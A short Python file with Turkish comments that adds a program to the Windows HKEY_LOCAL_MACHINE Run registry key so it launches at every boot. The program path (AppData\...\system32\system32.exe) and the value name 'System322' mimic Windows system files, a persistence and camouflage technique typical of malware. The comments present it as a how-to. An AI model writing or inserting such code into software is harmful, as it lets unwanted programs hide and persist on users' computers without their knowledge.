from winreg import HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, CloseKey, CreateKey, OpenKey, SetValueEx
import os
#Bu fonksiyonu çalıştırırsanız programınızı her bilgisayar başlattığında başlatır
def q5():
    data_path = os.path.expanduser('~')+"\\AppData\\Local\\Programs\\system32\\system32.exe"
    #bilgisayar başlatıldığında ilk çalışacak programlar bu kayıt dizinin de bulunuyor bizde bu dizine kendi programımızın yolunu atıyoruz 
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)
    SetValueEx(key, "System322", 0, REG_SZ, data_path)
    CloseKey(key)